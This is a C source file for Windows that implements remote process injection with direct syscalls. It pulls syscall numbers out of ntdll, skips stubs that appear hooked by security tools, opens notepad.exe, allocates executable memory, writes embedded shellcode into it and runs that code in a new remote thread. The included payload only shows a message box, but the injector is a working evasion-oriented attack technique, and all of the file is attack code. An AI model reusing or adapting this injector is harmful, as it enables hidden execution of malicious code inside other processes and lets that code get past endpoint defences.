#include <windows.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <string.h>
#include "handBag.h"
#include <psapi.h>
#include <wtsapi32.h>
#pragma comment(lib, "Wtsapi32.lib")

DWORD NtOpenProcessSSN = 0;
DWORD NtAllocateVirtualMemorySSN = 0;
DWORD NtProtectVirtualMemorySSN = 0;
DWORD NtCreateThreadExSSN = 0;
DWORD NtWriteVirtualMemorySSN = 0;
DWORD NtWaitForSingleObjectSSN = 0;
DWORD NtCloseSSN = 0;

DWORD GetSSN(HMODULE hNTDLL, LPCSTR NtFunction) {
    UINT_PTR funcAddr = (UINT_PTR)GetProcAddress(hNTDLL, NtFunction);
    if (!funcAddr) {
        warn("Failed to get address of %s", NtFunction);
        return 0;
    }


    if (*(PBYTE)funcAddr == 0xE9) {
        warn("Hooked stub detected for %s (0xE9 jmp at start) - SSN unreliable, skipping", NtFunction);
        return 0;
    }

    DWORD ssn = ((PBYTE)(funcAddr + 4))[0];
    info("\\_____\n          ||  %s\n          || -> Address:  %p\n          || -> Offset:   +0x4\n          || -> SSN:      0x%lx\n          ||_______________________________\n\n",
         NtFunction, (void*)funcAddr, ssn);
    return ssn;
}

HMODULE getMod(LPCWSTR modName) {
    HMODULE h = GetModuleHandleW(modName);
    if (h) {
        okay("Got handle to module!");
        info("\\___\n       ||%S\n       ||0x%p\n", modName, h);
    }
    return h;
}

int FindTarget(const char* procname) {
    WTS_PROCESS_INFOA* proc_info = NULL;
    DWORD count = 0;
    int pid = 0;

    if (!WTSEnumerateProcessesA(WTS_CURRENT_SERVER_HANDLE, 0, 1, &proc_info, &count))
        return 0;

    for (DWORD i = 0; i < count; i++) {
        if (lstrcmpiA(procname, proc_info[i].pProcessName) == 0) {
            pid = proc_info[i].ProcessId;
            break;
        }
    }
    WTSFreeMemory(proc_info);
    return pid;
}

void Janitor(HANDLE h) {
    if (h && h != INVALID_HANDLE_VALUE) {
        NtClose(h);
        okay("Handle closed");
    }
}

BOOL DirectSyscallsInjector(const PBYTE payload, SIZE_T payload_len) {
    NTSTATUS status;
    HANDLE hProc = NULL, hThread = NULL;
    HMODULE hNTDLL = NULL;
    PVOID rBuffer = NULL;
    SIZE_T allocSize = 0x1000, bytesWritten = 0;
    DWORD pid = 0;

    warn("Direct Syscalls Injector\n");

    hNTDLL = getMod(L"ntdll.dll");
    if (!hNTDLL) return FALSE;

    NtOpenProcessSSN          = GetSSN(hNTDLL, "NtOpenProcess");
    NtAllocateVirtualMemorySSN = GetSSN(hNTDLL, "NtAllocateVirtualMemory");
    NtWriteVirtualMemorySSN   = GetSSN(hNTDLL, "NtWriteVirtualMemory");
    NtCreateThreadExSSN       = GetSSN(hNTDLL, "NtCreateThreadEx");
    NtWaitForSingleObjectSSN  = GetSSN(hNTDLL, "NtWaitForSingleObject");
    NtCloseSSN                = GetSSN(hNTDLL, "NtClose");

    if (!NtOpenProcessSSN || !NtAllocateVirtualMemorySSN || !NtWriteVirtualMemorySSN ||
        !NtCreateThreadExSSN || !NtWaitForSingleObjectSSN || !NtCloseSSN) {
        warn("Failed to extract one or more SSNs");
        return FALSE;
    }

    pid = FindTarget("notepad.exe");
    if (!pid) {
        warn("Target process not found. Start notepad.exe first!");
        return FALSE;
    }
    info("Target PID: %lu", pid);

    OBJECT_ATTRIBUTES oa = { sizeof(oa) };
    CLIENT_ID cid = { (HANDLE)(ULONG_PTR)pid, NULL };

    status = NtOpenProcess(&hProc, PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
                                   PROCESS_VM_WRITE | PROCESS_VM_READ, &oa, &cid);
    if (status != STATUS_SUCCESS) {
        warn("NtOpenProcess failed: 0x%08X", status);
        return FALSE;
    }
    okay("Opened process handle: 0x%p", hProc);

    status = NtAllocateVirtualMemory(hProc, &rBuffer, 0, &allocSize,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (status != STATUS_SUCCESS) {
        warn("NtAllocateVirtualMemory failed: 0x%08X", status);
        Janitor(hProc);
        return FALSE;
    }
    okay("Allocated memory at: 0x%p", rBuffer);

    status = NtWriteVirtualMemory(hProc, rBuffer, (PVOID)payload, payload_len, &bytesWritten);
    if (status != STATUS_SUCCESS || bytesWritten != payload_len) {
        warn("NtWriteVirtualMemory failed: 0x%08X (wrote %zu/%zu)", status, bytesWritten, payload_len);
        Janitor(hProc);
        return FALSE;
    }
    okay("Wrote %zu bytes to remote buffer", bytesWritten);

    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProc,
                              (PVOID)rBuffer, NULL, 0, 0, 0, 0, NULL);
    if (status != STATUS_SUCCESS) {
        warn("NtCreateThreadEx failed: 0x%08X", status);
        Janitor(hProc);
        return FALSE;
    }
    okay("Remote thread created: 0x%p", hThread);

    NtWaitForSingleObject(hThread, FALSE, NULL);
    info("Execution triggered");

    Janitor(hThread);
    Janitor(hProc);
    return TRUE;
}

int main(void) {
    unsigned char payload[] =
            "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
            "\x48\x8D\x0D\x52\x00\x00\x00\xE8\xA4\x00\x00\x00\x4C\x8B\xF8"
            "\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
            "\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x85\x00\x00\x00\x4D\x33"
            "\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
            "\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x5C\x00\x00\x00\x48\x8D\x0D"
            "\x0A\x00\x00\x00\xE8\x5C\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
            "\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
            "\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
            "\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
            "\x78\x41\x00\x4E\x61\x64\x65\x72\x20\x41\x79\x6D\x61\x6E\x00"
            "\x41\x72\x74\x66\x75\x6C\x20\x44\x6F\x64\x67\x65\x72\x00\x45"
            "\x78\x69\x74\x50\x72\x6F\x63\x65\x73\x73\x00\x48\x83\xEC\x28"
            "\x65\x4C\x8B\x04\x25\x60\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D"
            "\x60\x10\x4D\x8B\x04\x24\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC"
            "\x84\xC0\x74\x26\x8A\x27\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A"
            "\xE0\x75\x08\x48\xFF\xC7\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D"
            "\x3B\xC4\x75\xD6\x48\x33\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58"
            "\x30\x44\x8B\x4B\x3C\x4C\x03\xCB\x49\x81\xC1\x88\x00\x00\x00"
            "\x45\x8B\x29\x4D\x85\xED\x75\x08\x48\x33\xC0\xE9\x85\x00\x00"
            "\x00\x4E\x8D\x04\x2B\x45\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48"
            "\x18\x45\x8B\x50\x20\x4C\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41"
            "\x8B\x39\x48\x03\xFB\x48\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0"
            "\x74\x09\xEB\xF5\xE2\xE6\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24"
            "\x4C\x03\xCB\x66\x41\x8B\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB"
            "\x41\x8B\x04\x89\x49\x3B\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48"
            "\x8D\x34\x18\x48\x8D\x7C\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E"
            "\x75\xFA\xA4\xC7\x07\x44\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7"
            "\x49\x8B\xCC\x48\x8B\xD6\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48"
            "\x83\xC4\x28\xC3";
    info("Payload size: %zu bytes", sizeof(payload));

    if (!DirectSyscallsInjector(payload, sizeof(payload))) {
        warn("Injection failed");
        return 1;
    }

    okay("Injection successful!");
    return 0;
}